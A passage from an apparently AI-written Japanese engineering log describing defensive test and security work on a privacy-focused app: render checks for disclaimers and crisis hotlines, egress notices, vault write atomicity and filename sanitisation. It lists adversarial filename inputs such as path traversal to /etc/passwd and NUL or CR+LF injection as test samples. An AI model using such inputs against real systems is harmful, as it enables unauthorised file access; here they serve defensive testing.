—— 台帳の `why` が 2026-09-12 から「別パス」と書いていた当のこと)。残る **31 本は「依って当たり前」を含む** ので門ではなく台帳にした: `store-roundtrip` (IndexedDB の往復。解決が `act` の外なので条件で待つには**非同期の述語**が要る)・`setup-flush` (落ちるのは主張ではなく**操作**の側で、固定回数が「待ち」ではなく**状態遷移の流し込み**として効いている —— **条件で待っても、遷移が起きていなければ待てない**)・`text-captured` / `text-helper` / `attribute` / `element-presence` / `hook-state` / `mock-call` (寄せられるが未着手)。★ **針は捨てず、見えていた 2 形を広げ、今も見えない 3 形を標本で固定した** (見えるようになったら鳴って表を直させる)。注記の中の言及を数えない `codeOnly()` も足した —— `taxDeductionCeilings.test.ts` は docblock で「`expect(text()).toContain(…)` は落ちたときに画面ぜんぶを刷る」と**説明している**だけで、その形の主張を持たない (法則 `mention-vs-declaration`)。法則 93 `wait-for-condition-not-ticks` に `harness('audit:tick-sensitivity')` と`tickSensitivityLedger.test.ts` が付いた)・**2026-09-21 パス 368 後も 11,931,716 B / 3,344,237 B で byte 単位で不変** (直したのは検査 2 本と法則・文書だけ —— **`__tests__/` は出荷物に入らない**。両方を組んで実測した。★ **まず訂正**: パス 367 で「`settle()` が条件でなく固定回数」と見立てたとき、私は**共有の待ちが既に在ることを知らなかった** —— パス 169 (2026-09-12) が `renderer/__tests__/jsdomWait.ts` に `settleUntil` / `waitForElement` / `waitForText` を置き、`waitHelperCensus.test.ts` で**手書きの条件待ち**を台帳 (6 本) と突き合わせ、docblock で危険を正しく名指しし (「固定回数の `settle` は…**空いている機械では足り、全件実行の負荷の下では足りないことがある**」)、過去 2 件の実例 (2026-09-09 `recordShapeAuditPanel` / 2026-09-12 `settingsGoogleOAuth`) まで書いていた。**足りなかったのは道具ではなく数である** —— その census の最後の対照は `expect(pollsByHand(fixed)).toBe(false)` で、注記は「固定回数は「待ち」ではないので、この台帳の対象外 (**数えるのは別の話**)」。つまり**落ちる原因そのものが母集団から外れていた**。このパスがその「別の話」である。**3 件目で tick 依存を確定させた** (実測): 直す前は **ticks=1 で 2 件落ち (CSV の取り込みと復元)・ticks=2 以上で通る** —— 既定の 8 でも負荷の下では足りないことがある。直した後は **ticks=0 / 1 / 2 / 8 すべて通る** (回数に依らない)。直しは `importSizeGuard` の**肯定の**文の主張 7 か所を既存の `waitForText` へ通し (否定は待っても意味が無いのでそのまま)、★ **自分が前パスで足した `safetyNoticeRendered` も同じ形だった**ので一緒に寄せた (1 パス前に自分で債務を 1 本増やしていた)。母集団は `fixedTickAssertionCensus.test.ts` が持つ —— 実測 **固定回数 108 本 / 肯定の主張つき 34 本 / 共有の待ちを使う 2 本 → 危ない形 32 本** (このパスで 34 → 32)。台帳は**両方向**で **32 本以下**の天井つき。**理由の欄は作らない** —— どの行も同じ「まだ寄せていない」で、理由が埋まると「保留を検査に書く」形 (法則 `no-weakness-as-spec`) になる。減らすことだけが正しい向きなので、数が増えないことだけを機械が持つ。対照 **4 方向すべて鳴る**: 危ない形を新しく足す / 台帳から 1 行消す / 寄せ終わった行を台帳に足す / 寄せた側を固定回数へ戻す。法則 **93 本目** `wait-for-condition-not-ticks` (**待つなら条件で待つ・回数では負荷が嘘をつく**)。`waitHelperCensus` の対照にも、その「別の話」がどこで数えられているかを書き足した)・**2026-09-21 パス 367 後も 11,931,716 B / 3,344,237 B で byte 単位で不変** (足したのは検査 1 本と法則の延長だけ。両方を組んで実測した。**危機のときの相談窓口が、消しても誰も鳴らなかった** —— パス 366 で足した法則 `user-facing-claim-held-at-render` を免責以外へ当て、安全側の守り 4 つを潰して全件を回した実測: ✅ 平文で書き出す前の確認 (`plaintextBackupNotice`) と置換復元の前の確認 (`restorePlan`) は鳴る / ❌ **`EmotionsPage` の危機のときの相談窓口**（「相談できる窓口（日本）」+ いのちの電話 0570-783-556 ほか + 厚労省「まもろうよこころ」へのボタン）・❌ **`SettingsPage` の立ち退きの警告 (2 か所とも)**。**判定の側は手厚い** —— `crisisDeliberation` が `predictCategory` / `judge` / `SEVERITY` を、`counseling` が `detectCrisis` と窓口の確証 (独立 2 出典・うち公的 1・`119`/`110` を必ず含む) を見る。**測られていないのは配達の側**で、つらいと打った人に番号が出るかは判定の正しさと別の問題である —— この repo が繰り返し直してきた「決定は測るが配達は測らない」形の一番重い現れだった。立ち退きの警告は、パス 351 が `durability` の判断・パス 353 が `EVICTION_RECOVERY` の表を機械に載せたのに**出るかどうか**が空いており、しかも **既存の検査が出る条件を型で除いていた** (`settingsProtectionScope` の標本の型は `durability: 'file' | 'persistent'` で `'best-effort'` が入らない = **警告が出る枝に一度も入っていなかった**)。機械 `safetyNoticeRendered.test.ts` (6 件) は**振る舞いだけ**で書いた: `EmotionsPage` を jsdom で描いて**メモ欄に実際に打ち** (値の tracker を通すため prototype の setter → `input`)、危機の見出しと窓口の label / detail が全部出ること・危機でないメモでは出ないこと / `StorageProtectionNotice` を `best-effort` で描いて警告と「控えた 24 語では戻せません」と `EVICTION_RECOVERY` の全行が**暗号化されている枝とされていない枝の両方**で出ること・`persistent` では出ないこと。対照 **6 方向すべて鳴る**。★ **閉じていない物**: 検証中に**全件 3 回のうち 1 回**だけ `importSizeGuard` の「対照: 上限以下のバックアップは読んで復元する」が落ちた。1 ファイルだけ 12 回回して 0 回・全件 2 回は緑 (17,901 件) —— **全件の負荷が要る揺れで、原因は特定していない** (見立ては `settle()` が条件ではなく固定回数で待つこと。**確かめていないので断定しない**・パス 335 と同じ家系に見える))・**2026-09-21 パス 366 後も 11,931,716 B / 3,344,237 B で byte 単位で不変** (足したのは検査 1 本と法則 1 本・文書の数の訂正だけ —— **オントロジーも `__tests__/` も出荷物に入らない**。両方を組んで実測した。**投資助言・法的助言の免責 7 か所のうち 5 か所は、消しても誰も鳴らなかった** —— 免責の**文言**には検査がいくつも在るが (`serviceAdvisor.test.ts` ほかが定数を見る)、それは「定数が在る」しか言わない。**利用者に届くかは描いているかで決まる。** 描画 7 か所を**全部潰して**全件を回すと落ちたのは **2 ファイル 3 件だけ**で、1 つずつ潰して分けると: ✅ `DocstudioPage` の計算書類の紙 (`docstudioKessanSheets`) と `ServiceActionPanel` (`mutualFundsImpossibleReturn`) / ❌ **`StocksPage` の「投資助言ではありません・過去パフォーマンスは将来のリターンを保証しません」**・❌ **`BusinessPage` の「投資助言・財務助言ではありません」**・❌ **`ShigyoConsole` の ⚖️ 法的助言の断り**・❌ **`DocstudioPage` の 12 種の書式の紙 (「個別事情に応じ弁護士・社労士・税理士等の専門家による確認をお勧めします」)**・❌ `EmotionsPage`。**5 か所は消した日に 17,883 件すべて緑のまま出荷される。** 機械は `disclaimerRendered.test.ts` (12 件): ① 描画の母集団を走査で導き (JSX の `{識別子[.メンバー…]}` のうち末尾が `disclaimer` の物・実測 7 件 / 6 ファイル) 件数つきの台帳と**両方向** ② **助言だけを描いて免責を描かない形を落とす** (同じオブジェクトの `recommendations` / `message` を描くなら `disclaimer` も描く) ③ **紙 1 枚につき断り 1 つ** (`.ds-paper` と `.ds-disclaimer` の数が等しい) ④ **振る舞いの背骨** —— `ShigyoConsole` を実際に jsdom で描いて、渡した文が DOM に出ること・渡さなければ `[role="note"]` ごと出ないことを見る (字面だけの検査にしない)。対照 **10 方向すべて鳴る** (7 か所の描画を 1 つずつ + 台帳 2 方向 + 回数)。法則 **92 本目** `user-facing-claim-held-at-render` (**利用者へ出す約束は、描く所で留める**) —— パス 365 と同じ家系をまとめた。★ **ついでに古い数を 1 つ直した** —— `docs/ARCHITECTURE.md` §8.3 が「執行者が散文だけの法則は…(**5 本**)」と書いていたが、生成物 `docs/ONTOLOGY.md` は **3 本**と言う。**生成側が正しく、手書きの数だけが古びていた**)・**2026-09-21 パス 365 後も 11,931,716 B / 3,344,237 B で byte 単位で不変** (足したのは検査 1 本と法則の延長だけ —— **オントロジーも `__tests__/` も出荷物に入らない**。両方を組んで実測した。**「外へ送る画面は何を送るかを言う」の母集団が AI とマイクだけだった** —— 法則 `egress-notice-before-send` の statement は母集団を「AI へ送る 8 画面・全画面のマイク」と名乗り、`enforcedBy` もその 2 本だけだったが、**利用者が打った個人データを第三者へ送る経路は他にも在った**: `security/check-email-breach` (**メールアドレス** → Have I Been Pwned) と `security/scan-url` (**URL** → VirusTotal)。**断りは今日在るし、よく書けている** —— VirusTotal の断りは「他の VirusTotal 利用者が検索できる状態で残ります」「取り消せません」「署名付きリンク・招待リンク・社内のホスト名など、人に見られて困る URL は入れないでください」まで書き、HIBP の断りは**隣のパスワード強度チェッカーが「送信しません」と約束している**ことに触れ、どちらもブラウザ版のプロキシ経由の話まで含む。**欠けていたのはそれを保つ物のほう** —— 実測 (2026-09-21): **HIBP の断りのブロックを丸ごと削除して全件を走らせると 17,868 件すべて緑**だった。つまり次に誰かが「欄を整理する」と言って消した日に黙って消える (パス 344 と同じ形)。**母集団は手で書かない** —— `aiEgressPairs.helpers` の `aiActionHandlers(marks)` に印を替えて渡し (`HIBP_API` / `VIRUSTOTAL_API`)、`main/clients/*.ts` の `ACTIONS` のうちその端点へ**到達する** handler を母集団にする (実測: handler 2 件 / 呼ぶ画面 1 枚)。`thirdPartyEgressDisclosed.test.ts` (15 件) が両方向の台帳と、行ごとに **① 受け手を名前で出す ② その近くで「送る」と言う ③ 断りが操作子より前に在る** (押してから知る形にしない) を要求する。対照 **5 方向すべて鳴る**: HIBP の断りを消す ❌2 (**実測で 17,868 件が緑だった当のもの**) / VirusTotal の断りを消す ❌2 / 断りを操作子より後ろへ動かす ❌1 / 台帳から 1 行消す ❌1 / 母集団に居ない行を台帳へ ❌1。★ **針を 2 度直した** —— ① 最初の針は**最初の出現だけ**を見ており、受け手の名前は見出し (「ローカル AV 検出 + HIBP/VirusTotal 連携」) や結果欄にも出るので落ちた。**製品ではなく針の誤り**で、すべての出現を走査してどれか 1 つが近くで「送る」と言うこと、に直し「見出しだけの言及は断りと数えない」を標本で留めた。② `originalSourcePolicy` が生の読み (`fs.readFileSync(f)` の `f` が変数) を捕まえたので、台帳へ登録せず `readOriginalSource` を通す形に直した (Stryker の sandbox で空の検査にならない側))・**2026-09-21 パス 364 後も 11,931,716 B / 3,344,237 B で byte 単位で不変** (直したのは `scripts/build-{teikan-maker,shugyokisoku-maker,docs-studio}.cjs` と `docs/`・新しい検査 1 本・法則だけ —— **配る単一 HTML の builder はアプリの出荷物に入らない**。両方を組んで実測した。**配る文書が氏名と住所を端末に残し、消す口が無かった** —— `lint:storage` の走査範囲 (`SCAN_DIR`) は **`src/renderer` だけ**で、利用者がダウンロードして開く単一 HTML **8 本**は母集団の外に居る。実測 (2026-09-21) すると **3 本が入力を `localStorage` へ自動保存**していた: `電子定款メーカー` (`teikan-maker-values-v1` —— **商号・本店・発起人の氏名と住所**・引受株数/出資額)・`就業規則メーカー` (`shugyokisoku-maker-values-v1`)・`経営書類スタジオ` (`docs-studio-values-v1` —— 12 種の差込値)。**3 本とも `removeItem` が 0 件**で `消去 / クリア / リセット` の UI ラベルも 0 件 (経営書類スタジオの 3 件は NDA 雛形の本文「返還又は消去」)。つまり**文書の中から消す手段が無く**、利用者はブラウザのサイトデータ設定を知らないかぎり自分の氏名と住所を入れたままにするほか無かった。**アプリの「すべてのデータを削除」は構造的に届かない** —— 保存先はその文書自身の生成元なので `eraseAll` を直しても解決しない側で、`docs/DATA_PROTECTION.md` の在庫にも 3 鍵とも載っていなかった (「この表に無い保存先は、問われもしない」)。入れた人から見ると「個人情報を扱う画面」ではなく「書類を作る道具」なので**残っている自覚が持ちにくい** —— 法則 `escape-hatch-stays-open` の、**逃げ口が最初から無い**形である。直しは 3 本に「🗑 入力を消す」を足し (確認文は**何が消えるかを名指しする**・押すと鍵を消して**画面も初期化する**)、在庫に節を足した。**自動保存そのものは残す** —— 書きかけが消えないための機能で docblock にも最初からそう書いてある。**実機で確かめた** (chromium・`file://`): 3 本とも「打つ → 保存される → 押す → 鍵が消え入力欄も空」。機械は `distributedArtifactStorage.test.ts` (21 件) が母集団を走査で導き両方向の台帳に、保存する行へ ① 消す口の handler の中で自分の鍵を `removeItem` ② 消す口の id が実在 ③ 確認文が「消します」「元に戻せません」を言う ④ **在庫に鍵が載っている**を要求する。★ **対照が 1 つ鳴らず、それが正しい報せだった** —— 最初の ① は全文の `toContain` で、**実物を `void 0` に潰しても通った** (builder に足した self-check の `required` 配列が同じ綴りを持つ・法則 `mention-vs-declaration`)。handler の中だけを切り出す形に直し、**切り出しが self-check の標本に当たらないこと**を標本で留めた。直した後の対照 **5 方向すべて鳴る**。**`lint:storage` は広げない** —— 外は全件を守りつきで台帳に載せる (法則 `outside-scope-gets-its-own-census` がパス 342 で立てた判断そのもの。配る builder は 8 本しかない)。配る 3 本の byte: 就業規則 31,578 → 32,644・経営書類 54,005 → 55,220・電子定款 30,886 → 32,099 (業務自動化ダッシュボードは保存しないので不変 16,345)。★ **この日の他の 4 つの探りは何も見つからなかった**: ブラウザ版 shim の資格情報を持つ出口 4 本 (`err()` が**全ての失敗が通る 1 本の口**で `redactForMessage` を必ず掛ける・パス 312。実測: `Headers.append: "<値>" is an invalid header value.` は `sk-ant-` でも 64 桁 16 進でも `[REDACTED]` になる)・`window.addEventListener('message')` は **0 件**・`usePlan.ts` の `storage` イベントは `isPlanTier` で検めてから使う・配る 4 本に `lint-sample-data --artifact` を当てて **exit 0**。**測って何も無かったことも記録する**)・**2026-09-21 パス 363 後も 11,931,716 B / 3,344,237 B で byte 単位で不変** (直したのは `assets/manifest.webmanifest` と `scripts/` 2 本・`renderer/theme.ts` の**注記**・新しい検査 1 本・法則・文書だけ —— **注記は最小化で落ち、`assets/` も `scripts/` も `__tests__/` も出荷物に入らない**。両方を組んで実測した。**母体 (OS / ブラウザの枠) へ伝える下地色の写しが 5 つ在り、機械が縛っていたのは 1 つだけだった** —— 出どころは `styles.css` の `:root { --bg }` (既定 = ライト `#fff7fa` / ダーク `#1b1520`) 1 つなのに、`main/windowPrefs.ts` (✅ `windowPrefs.test.ts` が照合)・`renderer/theme.ts` (✅ 実値を読む・字面なし)・`scripts/inject-pwa.cjs` (❌)・`assets/manifest.webmanifest` (❌)・`scripts/build-landing.cjs` (❌ 同じファイルに 2 度) に散っており、**縛られていない 3 つのうち 2 つがその場で誤っていた**。★ **① manifest の色は、どの版の `--bg` とも一致しない** —— `theme_color` / `background_color` は `#0e0f13` で、実測すると今のライトでも今のダークでも再設計前 (`#0f1117`) でもなく、`git log -S '#0e0f13' -- src/renderer/styles.css` は **0 コミット**である。**履歴が原因を持っていた**: `#0e0f13` は `423da6df` (2026-08-31) で `inject-pwa.cjs` と manifest の**両方**に入り、UI 再設計 `1f87b259` (2026-09-17) が `inject-pwa.cjs` だけを `#fff7fa` へ直して**manifest を置き去りにした** (その日の handoff にも「`inject-pwa.cjs` を `#0e0f13` → `#fff7fa`」とだけ書いてある)。**パス 318 の `syncHostChrome` は構造的に届かない** —— `background_color` は**インストールした PWA の起動画面**、`theme_color` は OS がインストール時に控える色で、**どちらも頁の JS より先に読まれる**。パス 318 の docblock は母体を 2 つ (PWA の meta・デスクトップの窓) しか数えておらず、**3 つ目がこれ**だった (結果: インストールした PWA は起動のたびにほぼ黒の画面を出してから淡いピンクのアプリを描く)。★ **② 注入した色が 3 文書のうち 1 つに対して誤っていた** —— 実測 (実物の成果物へ注入): ランディング (`_site/index.html` = 公開サイトの根) は `--bg: #0f1117` の暗い頁で自分の theme-color を既に持つため、注入後は **theme-color が 2 つ** (`#0f1117` と `#fff7fa`) 載っていた。HTML の規定では最初が勝つので**今日の見た目は正しかった** —— 偽だったのは理由のほうで、**どちらが効くかを決めていたのは byte の順序**である。直しは `inject-pwa.cjs` から定数を消し、**`syncHostChrome` と同じ規則** (文書自身が名乗れば足さない / 名乗らなければその文書の**修飾の無い** `:root { --bg }` の実値 / どちらでもなければ足さない —— 誤った色は誰も受けられないが無色は manifest の `theme_color` が受ける) にし、既定を名乗る `<style>` が食い違ったら**落とす** (走査順で公開色を決めない)。実測 (直した後): `index.html` `['#0f1117']` / `app.html` `['#fff7fa']` / `lite.html` `['#fff7fa']` —— 各 1 つ・各文書に対して正しい。機械は `hostChromeColorCensus.test.ts` (18 件) が母集団を**走査で導いて** (母体の色に関わる綴りを持つ `src`/`scripts`/`assets` の全 15 件) 種類と理由の台帳と**両方向**に突き合わせ、種類ごとに要求を掛ける (`pinned-literal` は全部がライトの `--bg` と一致・`derives` は色の字面を **1 つも持たない**・`own-document` は 1 か所で持つ)。**色の字面は「コード」だけを見る** —— この検査の docblock 自身が 4 つの色を挙げるので、注記を読んだままだと「字面を持たない」の主張が**自分の説明文で落ちる** (パス 348 と同じ形)。対照 **7 方向すべて鳴る**: manifest を戻す ❌2 / `inject-pwa` に字面 ❌1 / ランディングの meta に字面 ❌1 / 食い違いで落とすのをやめる ❌1 / 台帳に無いファイルが増える ❌1 / 台帳から 1 行消す ❌1 / 母集団に居ない行を台帳へ ❌1。★ **この検査は作業中に私の編集を 2 回捕まえた** —— 法則の statement に欄名を書いた瞬間に `ontology/laws.ts` が、`lint:forbidden` の `KNOWN_SUPPRESSIONS` に注記を足した瞬間に `lint-forbidden-patterns.cjs` が母集団へ入り、どちらも両方向の台帳がその場で落ちた (綴りを避けず `names-only` として載せた)。★ **写しを 1 つ作ったので、自分で拡張した法則を自分に当てた** —— `inject-pwa.cjs` は素の CJS で `shared/escape.ts` の `isHexColor` を読めず `#[0-9a-fA-F]{6}` の写しを持つ (`build-academic-md.cjs` ほか 3 本と同じ前例)。`lint:forbidden` の台帳に理由つきで登録し、**同じ標本 9 種を実物と `isHexColor` の両方に通して**答えが割れないことを census が留める。法則 `copy-pinned-by-parity` に「**写しは `.ts` の外にも在る**」を足した (パリティ検査が `.ts` しか見ないと、webmanifest・ビルド script・生成 HTML に載った写しは永久に映らない)。`assets/manifest.webmanifest` と `scripts/inject-pwa.cjs` は**鎖の保護対象**なので、**編集した直後に** `chain:verify` → `chain:append` で block **#248** を採掘した (パス 361・362 で 2 パス連続に間違えた順序を、今回は先に直せた)。★ **この日の他の 4 つの探りは何も見つからなかった**: `assets/sw.js` (Service Worker) は「出荷される origin 特権のコードがどのゲートにも入っていない」と見立てたが、実測すると `lint:forbidden` の `MUST_SCAN` に**名指しで載って**おり鎖の保護対象でもあった (**見立ては偽**)・バックアップの復元 (読む前の大きさの門・checksum 必須・暗号封筒の再帰が 1 段・`assertKdfIterations`)・`shellOpenGate.ts` (realpath → 閉じ込め → 拡張子 allowlist)・`library/preview.ts` (画像は読む前に 8 MB で断り、テキストは `blob.slice` で切ってから読む)。**測って何も無かったことも記録する**)・**2026-09-21 パス 362 後も 11,931,716 B / 3,344,237 B で byte 単位で不変** (直したのは `renderer/fs/fsa.ts` の**注記**と新しい検査 1 本・オントロジー・文書だけ —— **注記は最小化で落ち、`__tests__/` は出荷物に入らない**。両方を組んで実測した。**2026-08-23 に偽と測った主張が、写しの片方に残っていた** —— `shared/safeFilename.ts` は「**「利用者入力ではない」は誤りだった (2026-08-23)**」という節を持ち、「渡ってくる名前はアプリが組み立てたもので利用者入力ではないため、これは多層防御」を**teamradar の SVG 書き出しを反例として撤回している**。ところが**同じ文の写しが `renderer/fs/fsa.ts` に残り、パス 362 まで誰も直さなかった** —— しかもそれは**関門 (`isSafeFilename`) のすぐ隣**に、それを「飾り」と呼ぶ形で立っていた。実物の経路 (実測): `teamradar の export-svg` → `filenameFromTitle(p.title, …)` (**`p.title` は画面で利用者が打つ**) → `saveToLibrary` → `mirrorToFolder(REAL_MIRROR, …)` → `REAL_MIRROR.write === writeBlobToFolder` (**実ディスクへ書く**)。**今日この関門は破れない** (`filenameFromTitle` が `[^\w.-]+` を `-` へ畳み時刻の接尾辞を付け、`writeBlobToFolder` は それでも `isSafeFilename` を先に通す) —— 危ないのは**説明のほう**で、`safeFilename.ts` 自身が「『入力は安全だからここは飾り』という説明のままにしておくと、**次にこの関門を緩める判断の根拠が嘘になる**」と名指ししている。★ **散文の綴りではなく振る舞いを留めた** —— 「その文が無いこと」の検査は**言い換えられた瞬間に黙る**ので、`folderMirrorUserInput.test.ts` (15 件) が**事実**を固定する: `REAL_MIRROR.write` が本物の `writeBlobToFolder` であること・利用者が打った題名から作った名前がそこへ届くこと・敵性の題名 11 種がすべて 1 階層の安全な名前になること (針が当たる標本つき)。対照 2 方向とも鳴る: `filenameFromTitle` の消毒を外す ❌5 / `REAL_MIRROR.write` を別の物へ ❌1。法則 `measure-before-claim` に「**訂正は写しの数だけ要る**」を足した。★ **`fsa.ts` も鎖の保護対象で、block #247 を採掘した** —— **パス 361 と 2 パス連続で同じ順序を間違えた**。パス 361 の記録に「順序は 編集 → `chain:append` → 全件」と自分で書いた翌パスに、また編集してそのまま全件を回して外側の証人に捕まった。**書き留めただけでは私の手は変わらなかった** —— `src/renderer/{security,fs,network}/` を触ったら**その場で `chain:verify`** を回す。★ **この日の他の 4 つの探りは何も見つからなかった**: 法則 `parity-is-not-correctness` は**私が提案した形では機械化できない** (「対になる正しさの検査が在るか」を import で数えると、`vi.mock` / `readOriginalSource` を使う 5 本が「無い」に見える —— **針の側の artifact**だった。「同じモジュールを import する検査が在る」台帳は自明に通るので作らない)・library の立ち退き (パス 188 の `it.size ?? 0` で NaN 汚染は塞がれている)・自動施錠 (施錠後の再開は `vaultUnlocked` 依存で効く)・`lockWorkspace` (「他のタブに届かない」は**歴史として**書かれており、`lockEverywhere` + `BroadcastChannel` + `lockPathCensus` が直しとして続く)。**測って何も無かったことも記録する**)・**2026-09-21 パス 361 後の計測: 11,931,716 B / 3,344,237 B (両方 +26 B** —— `initialize` の `idbPut` 2 回を `idbPutAll` 1 回へ替えた分 (配列の綴りがわずかに長い)。`security/vault.ts` は両ビルドが読むので LITE も同じだけ増える。**対で意味を持つ保管値を 2 トランザクションで書いていた** —— `vault.ts` の `idbPutAll` は自分の docblock で危険を名指ししている (「`idbPut` を 2 回呼ぶと**トランザクションが 2 つ**になる。パスワード周りではこれが効く —— meta を書いた後に `master-wrap` の書き込みが失敗すると、**新旧どちらのパスワードでも開けない保管庫**が残る」)。ところが**その当のことを `initialize` だけがやっていた** —— `changePassword` と `recoverWithMnemonic` は最初から `idbPutAll` を通っていた。**実測 (2026-09-21) は docblock の警告より静かで悪い**: meta だけ書けた金庫を作って実物の API を叩くと `unlock(password)` → **UNLOCK SUCCEEDED**・`setToken`/`getToken` → **ok**・`recoverWithMnemonic` → **TOKEN LOST (null)**。`unlock` は master-wrap の無い金庫を **Phase E 以前の旧形式**と見なして `currentKey = passwordKey` へ倒す (前方互換として正しい) ので、**利用者は動く金庫を見て設定をやり直さない** —— しかも `initialize` は meta が在れば「既に初期化されています」と断るので**やり直せない**。その間のトークンは passwordKey で包まれるが、meta の `recoveryWrappedKey` が包むのは**本物の master 鍵**なので、**大事に控えた 24 語で復旧した瞬間に実効鍵が入れ替わり、それまでのトークンが全部読めなくなる**。★ **断る側には倒さない (測って決めた)** —— 「Phase E を名乗るのに master-wrap が無ければ unlock を断る」は**既にこの状態に居る利用者にとって改悪**である (今読めているトークンがその場で読めなくなり、復旧しても失われる結末は変わらない)。master-wrap は master 鍵が無いと作れず、master 鍵は復旧枝からしか出てこないので**解錠時に直す道も無い**。だから塞ぐのは**作る側**だけにした。機械は `vaultPairedWrites.test.ts` (3 件): ① `initialize` が 2 つを **1 トランザクション**で書く(`db.transaction` を数える振る舞いの検査) ② この組を書く 3 つが全部 `idbPutAll` を通る (両方向) ③ **旧形式の前方互換は残っている** (直しは作る側を原子的にすることであって、前方互換を消すことではない)。法則 91 本目 `paired-secrets-written-atomically`。対照 2 方向とも鳴る: `initialize` を `idbPut` 2 回へ戻す ❌2 (`expected [ [ 'vault' ], [ 'master-wrap' ] ] to deeply equal [ [ 'vault', 'master-wrap' ] ]`) / 前方互換を消す ❌1。`vault.ts` は**整合性チェーンの保護対象**なので `chain:append` で block **#246** を採掘した —— ★ **それに気付いたのは `chain:verify` ではなく `npm test` の外側の証人** (`integrityChainWitness.test.ts` が**ゲートを呼ばずにディスクから Merkle 根を引き直す**)。私は `vault.ts` を触る**前**に `chain:verify` を回して緑を見ており、順序は**編集 → `chain:append` → 全件**である。★ もう 1 つ: 最初に書いた観測器が `master-wrap` を 2 回数えた —— `idbPutAll` は entry ごとに `tx.objectStore(...)` を呼び、fake-indexeddb は同じインスタンスを返すので**自分の包みを包んでいた** (製品ではなく観測器の誤り。ストアごとに 1 度だけ包む形に直した)。**出荷物が動いたので実機も回した**: `perf` OK (LITE DCL 153 ms / heap 10.2 MB・FULL DCL 424 ms / heap 36.8 MB)・`e2e` **455 件 ❌ 0**・`e2e:lite` **455 件 ❌ 0**)・**2026-09-21 パス 360 後の計測: 11,931,690 B / 3,344,211 B (両方 +841 B** —— 日付が読める行だけを通す漏斗 `readableSalesRows` と断りの 1 文 `unreadableSalesDateNote`、それを出す 2 画面 (`SalesPage` / `KpiPage`) の分。**増分の大半は日本語の 1 文**で、docblock は最小化で落ちる。`renderer/data/` は両ビルドが読むので LITE も同じだけ増える。**壊れた行が 1 件入ると 2 画面が投げていた** —— `sales.ts` は 57 行上の `salesPeriod` で「読める日付 = 暦に在る日 (判定は `shared/isoDate.ts` —— 保存側の `isValidDate` と同じ 1 つ)」と書いて `isCalendarDate` で絞るのに、すぐ下の `monthlyTotals` は `e.date.slice(0, 7)` と**素で読んでいた** (`salesKpiBridge.monthOf` も 3 か所目として素)。**同じファイルの中で同じ問いが 2 通りに答えられていた。** 実測 (2026-09-21): `COLLECTION_SHAPES` が拒む行をcollection ごとに 1 件ずつ入れて **74 画面**を描くと、**欄が無い行 (`{}`) で 2 画面が投げ** (`sales` = `monthlyTotals` / `kpi` = `salesKpiBridge.monthOf`・どちらも `TypeError: Cannot read properties of undefined (reading 'slice')`)、**欄は在って型が違う行 (`date: 'bad'`) では 0 画面** —— `'bad'.slice` は通るので、**投げるのは欄が無いときだけ**である。そういう行は実在しうる: 復元の入口 `store.importAll` が中身の形を見るのは 2026-09-05 からで、それ以前に復元した・古い版が書いた行は既に保存されている (`recordShapeAudit.ts` がその母集団のために在る)。**読みで落とさないのは設計であって穴ではない** —— `recordShapeAudit.ts` の docblock が「形の違うレコードが 1 件あると、その画面は描画で投げて境界が受ける —— 画面は開けず、開けないので画面からは消せない。ここが唯一の出口になる」と書くとおり、store が読みで落とすと**壊れた行が UI から触れなくなる** (`library.ts` の「行そのものは落とさない」= パス 136 と同じ理由)。**その設計は「逃げ口が開いている」ことに全体重を掛けている** —— 逃げ口 (設定画面の点検パネル) 自身が壊れた行で投げたら、利用者は**自分のデータから永久に締め出され、全ゲートは緑のまま**である。今日は通る (実測) が、設定画面に `useCollection` を 1 つ足せば静かに崩れる —— **それを数える機械が 1 つも無かった**。直しは両方を `readableSalesRows` に通し、**落とした件数を画面が言う** (黙って除くと売上高が小さく出て利用者は気づけない —— `kpiActuals.ts` の `readablePeriodRows` / `unreadablePeriodNote` (パス 225) と同じ形で、その文は既に「設定の『形式の合わない記録』から消せます」と逃げ口を名指ししている)。母集団の機械 `malformedStoreRenders.test.ts` (5 件) が **① 逃げ口が壊れた行の下でも描けて『調べる』が押せること**を 2 通りの壊し方で・**② 投げる画面を両方向の台帳で** (今は**空**・増えたら落ち、直ったら「台帳から消せ」と落ちる)・③ 壊し方が実際に形の判定へ当たる床 (19 / 23) を持つ。★ **壊れた行は形自身の欄の一覧から導く** —— 手書きの候補表で測った最初の 1 回は `highlight-settings` を「拒めない」と誤判定した (私の表がその欄名を持っていなかっただけ)。`Symbol` は sentinel に入れない —— IndexedDB の structured clone が通さないので**保存値として存在し得ない** (実測 `DataCloneError`)。法則 90 本目 `escape-hatch-stays-open`。対照 4 方向とも鳴る: `monthlyTotals` を素へ戻す ❌1 (`['sales']`) / 橋を素へ戻す ❌1 (`['kpi']`) / 台帳に居ない画面を足す ❌2 / 逃げ口を投げさせる ❌4。**出荷物が動いたので実機も回した**: `perf` OK (LITE DCL 159 ms / heap 10.2 MB・FULL DCL 428 ms / heap 37 MB)・`e2e` **455 件 ❌ 0**・`e2e:lite` **455 件 ❌ 0**)・**2026-09-20 パス 359 後の計測: 11,930,849 B / 3,343,370 B (両方 −39 B** —— 保管層から読み出す 3 つの文字列欄を、`typeof === 'string'` から**書く側が呼ぶ 3 つの関門**(`isSafeFilename` / `isSafeMime` / `isSafeServiceId`) へ替えた分。**減るのは、関門が既に同じモジュールに在り (`put()` が呼ぶ)、最小化後は `typeof r.X==="string"` より短くなるため** —— 新しいコードは 1 行も足していない (docblock は最小化で落ちる)。`renderer/library/` は両ビルドが読むので LITE も同じだけ減る。**関門の docblock が名乗る消費者が 2 つで、実物の出口が 3 種類だった** —— `shared/safeFilename.ts` は自分を「ファイル名として受け取ってよい文字列か —— **アプリ全体で 1 つだけ持つ**」と名乗り、脅威モデルを「**入口が出口より緩い**状態は、『新しい書き出し経路が再検査を忘れた瞬間』に穴になる」と書き、消費者として `library.put()` と `writeBlobToFolder()` の **2 つ**を名指ししている。実測 (2026-09-20): 呼び出しは実物でも 2 か所で、**どちらも保管層**。ところが名前を決める出口は 3 種類目が在った —— **`a.download` 10 か所**で、保管層を 1 つも通らない。8 つはリテラル + 時刻の組み立てだが、**2 つが保管層から戻る値**を載せていた: ① `LibraryPage.tsx:147` の `item.filename` —— `metaFromStored` は 3 つの文字列欄を `typeof === 'string'` だけで通していたので、**`put()` が拒む 9 形が 9/9 素通り**した (`../../../../etc/passwd` / `a/b.txt` / `a\b.txt` / `.` / `..` / 空 / NUL / CR+LF / 5,000 字)。② `FinancialAnalysis.tsx:919` の `selected.unit.id` —— 記録層の `list()` が `cur.value as StoredRecord<T>` と無検査キャストする。**live な結果は限定的だと正直に言う**: `a.download` の値は **UA 